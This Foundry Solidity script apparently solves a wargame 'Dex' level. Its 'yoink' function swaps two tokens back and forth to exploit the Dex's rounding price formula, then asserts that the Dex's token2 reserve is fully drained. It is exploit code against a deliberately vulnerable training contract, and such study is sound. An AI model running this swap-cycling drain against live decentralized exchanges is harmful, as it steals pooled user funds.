// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Script.sol";
import "src/dex/Dex.sol";

contract DexScript is Script {
    Dex private _dex;

    function setUp() public {
        _dex = new Dex();
        ERC20 token1 = new SwappableToken(address(_dex), "T1", "T1", 110);
        ERC20 token2 = new SwappableToken(address(_dex), "T2", "T2", 110);
        token1.transfer(address(_dex), 100);
        token2.transfer(address(_dex), 100);
        _dex.setTokens(address(token1), address(token2));
    }

    function yoink(address eoa, Dex dex) public {
        vm.startBroadcast(eoa);
        dex.approve(address(dex), type(uint256).max);
        address token1 = dex.token1();
        address token2 = dex.token2();
        dex.swap(token2, token1, dex.balanceOf(token2, eoa));
        dex.swap(token1, token2, dex.balanceOf(token1, eoa));
        dex.swap(token2, token1, dex.balanceOf(token2, eoa));
        dex.swap(token1, token2, dex.balanceOf(token1, eoa));
        dex.swap(token2, token1, dex.balanceOf(token2, eoa));
        dex.swap(token1, token2, 45);
        assert(dex.balanceOf(token2, address(dex)) == 0);
    }
}
